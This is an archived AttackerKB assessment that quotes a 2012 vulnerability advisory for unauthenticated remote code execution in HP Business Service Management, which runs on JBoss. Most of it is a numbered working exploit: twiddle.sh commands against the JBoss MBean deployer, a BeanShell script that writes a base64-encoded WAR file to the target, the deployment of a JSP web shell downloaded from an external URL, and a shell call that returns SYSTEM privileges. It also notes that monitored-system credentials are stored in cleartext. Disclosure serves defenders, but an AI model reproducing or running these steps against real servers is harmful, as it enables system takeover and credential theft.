---
title: HP Business Service Management Remote Code Execution
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2012-05-21T20:55:00'
created: '2019-09-12T18:07:51.582086'
revision_date: '2020-02-13T17:12:09.299065'
assessment_id: 96ce1881-212b-4f75-bf71-860aef146aa0
topic_id: 0516ee37-46c2-4143-a018-2620e6c806cd
topic_short_id: thIkC97rG7
topic_slug: hp-business-service-management-remote-code-execution
akb_topic_url: https://attackerkb.com/topics/thIkC97rG7/hp-business-service-management-remote-code-execution
akb_assessment_url: https://attackerkb.com/topics/thIkC97rG7/hp-business-service-management-remote-code-execution#96ce1881-212b-4f75-bf71-860aef146aa0
---

# HP Business Service Management Remote Code Execution

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/thIkC97rG7/hp-business-service-management-remote-code-execution#96ce1881-212b-4f75-bf71-860aef146aa0).*

---

Download Software (version 9.10):

http://www8.hp.com/us/en/software-solutions/software.html?compURI=1170773#

Question: is 9.10 vulnerable? It’s the one available for download

Remote Code Execution in HP Business Service Management leads to full system compromise (CVE-2012-2561)

HP Business Service Management (HPBSM) is build around the JBoss Application Server. In its standard configuration and when configured according to the HP installations guide, the newest fully patched version 9.12 comes with an open invoker-servlet (/invoker/JMXInvokerServlet does not require authentication) but more importantly, with RMI (port tcp/4444) and JDNI (tcp/1098 and tcp/1099) accessible without authentication. This gives a remote attacker access to the adapter service and therefore access to MBeans of the JBoss AS.

To exploit the vulnerability, an attacker can remotely deploy an application and call it via RMI. This can be done easily by downloading the official JBoss AS (e.g. jboss-4.2.3.GA) which includes the tool "twiddle.sh" in the bin-directory. With this tool, the RMI interface can be (ab-)used as follows to compromise the HPBSM and get code execution:

1. jboss-4.2.3.GA/bin/twiddle.sh -s <servername> get jboss.system:type=ServerInfo
--> this shows that the interface is accessible and does work

2. create a simple jsp-shell and bundle it as a valid .war file (or use a ready one like http://www.redteam-pentesting.de/files/redteamjboss.tar.gz in the WAR directory)
--> this will be the shell on the attacked machine

3. create a base64-representation of the war file (e.g. "base64 -w 0 hpbsm.war >> hpbsm.war.base64")
--> this is needed for the deployer script which can only be ascii

4. create a text file without any line breaks as deployer help script "deployer.bsh":

import java.io.FileOutputStream; import sun.misc.BASE64Decoder; String val="<insert-hpbsm.war.base64-content>"; BASE64Decoder decoder = new BASE64Decoder(); byte[] byteval=decoder.decodeBuffer(val); FileOutputStream fs = new FileOutputStream("C:\WINDOWS\TEMP\hpbsm.war"); fs,write(byteval); fs.close();

5. create the remote file (first remote code execution):
jboss-4.2.3.GA/bin/twiddle.sh -s <servername> invoke jboss.deployer:service=BSHDeployer createScriptDeployment "`cat deployer.bsh`" deployer.bsh
--> this creates the war file in C:\windows\temp on the remote attacked machine

6. deploy the created file (second remote code execution):
jboss-4.2.3.GA/bin/twiddle.sh -s <servername> invoke jboss.system:service=MainDeployer deploy "file:C:/WINDOWS/TEMP/hpbsm.war"
--> now the attackers jsp-shell is deployed

7. make sure the deployment was successful by looking up your jsp-shell:
http://<servername>:8080/status?full=true

8. call the actual shell (in this case, it's the one from the redteamjboss.tar.gz):
http://<servername>:8080/hpbsm/shell.jsp?pass=secret&cmd=whoami
--> the output is "nt/system" which means that the remote code execution did work and the attacker even has the highest possible system rights because the server process runs as nt/system!

This works even through firewalled HPBSM installations which are not allowed to make outgoing requests.

Side note: HPBSM is a product that is used to monitor other critical systems. To be able to do that, HPBSM servers need so called "scripts" which include clear text credentials for the monitored systems! Therefore, an attacker gains not only full access to the HPBSM server itself but potentially gains accounts and credentials to numerous important systems because in general, monitored systems are important :-)

David Elze, 2012-05-21 (vuln found 2012-03-30 & reported 2012-04-02)
